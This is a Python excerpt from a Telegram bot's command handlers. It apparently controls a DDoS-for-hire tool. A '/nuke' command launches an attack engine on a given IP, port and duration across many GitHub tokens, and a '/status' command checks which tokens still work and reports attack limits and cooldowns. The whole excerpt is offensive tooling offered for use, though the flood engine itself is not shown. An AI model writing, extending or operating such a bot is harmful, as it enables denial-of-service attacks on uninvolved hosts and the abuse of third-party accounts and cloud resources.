async def nuke_command(update, context):
    """/nuke <ip> <port> <duration> - Launch on ALL tokens"""
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /nuke <ip> <port> <duration>")
        return
    
    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    
    if not github_tokens:
        await update.message.reply_text("❌ No tokens available!")
        return
    
    msg = await update.message.reply_text(f"🔥 Launching nuke on {ip}:{port} with {len(github_tokens)} tokens...")
    
    engine = AttackEngine(github_tokens)
    result = engine.launch_attack(ip, port, duration)
    
    response = f"""💥 **NUKE COMPLETED**

🎯 Target: `{ip}:{port}`
⚡ Method: `{result['method']}`
📊 Tokens: `{result['total']}`
✅ Success: `{result['success']}`
❌ Failed: `{result['failed']}`
⏱️ Time: `{result['elapsed']}s`

**Details:**
"""
    for r in result['results'][:10]:
        response += f"  → {r['username']}: {r['status']}\n"
    
    if len(result['results']) > 10:
        response += f"  ... and {len(result['results'])-10} more"
    
    await msg.edit_text(response)


async def status_command(update, context):
    """/status - Show bot health"""
    active_tokens = 0
    for token in github_tokens:
        try:
            g = Github(token['token'])
            g.get_user().login
            active_tokens += 1
        except:
            pass
    
    await update.message.reply_text(f"""📊 **BOT STATUS**

🤖 Uptime: Running
👤 Users: {len(approved_users)}
🔑 Tokens: {len(github_tokens)} total, {active_tokens} active
⏳ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
📦 Binary: {'✅' if check_binary_exists() else '❌ Missing'}
""")
